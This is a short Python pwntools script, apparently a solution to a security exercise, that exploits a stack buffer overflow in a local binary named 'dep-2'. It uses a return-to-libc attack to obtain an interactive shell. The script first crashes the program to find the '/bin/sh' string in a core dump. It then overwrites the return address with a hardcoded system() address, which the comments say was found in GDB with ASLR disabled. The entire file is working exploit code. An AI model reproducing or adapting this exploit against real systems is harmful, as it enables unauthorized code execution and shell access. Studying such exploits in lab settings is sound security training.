from pwn import *

# GDB says buffer starts at ebp - 0x88

p = process(["./dep-2", "/bin/sh"])
system_addr = 0xf7e39da0 # Found in GDB.  No ASLR

# GARBAGE ATTACK TO FIND /bin/sh
inp = "a" * 0x100
p.send(inp)
p.recv(0x100)
p.wait()
c = Core("./core")
binsh_addr = c.stack.find("/bin/sh")

p = process(["./dep-2", "/bin/sh"])

# [0x88][ebp][retaddr][4 garbage bytes][arg1(/bin/sh)][arg2][arg3]
inp = "a" * 0x88 + "bbbb" + p32(system_addr) + "cccc" + p32(binsh_addr) + p32(0) + p32(0)

# Launch attack
p.send(inp)
p.interactive()
quit()
